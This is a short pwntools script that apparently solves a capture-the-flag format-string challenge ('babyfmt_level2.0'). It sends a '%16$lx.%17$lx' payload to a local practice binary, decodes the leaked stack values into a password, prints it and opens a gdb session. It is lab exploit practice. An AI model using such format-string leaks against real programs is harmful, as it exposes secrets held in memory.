from pwn import * 

binary = './babyfmt_level2.0'

p = process(binary)

s = '''
b * main
'''




p.sendline("%16$lx.%17$lx")
p.recvuntil("I will now call printf on your data!\n\n")

leak = p.recvline().strip().decode()

first, second = leak.split(".")

first = bytes.fromhex(first).decode()[::-1]
second = bytes.fromhex(second).decode()[::-1]


password = first + second

print(password) 


gdb.attach(p, s)

p.interactive()
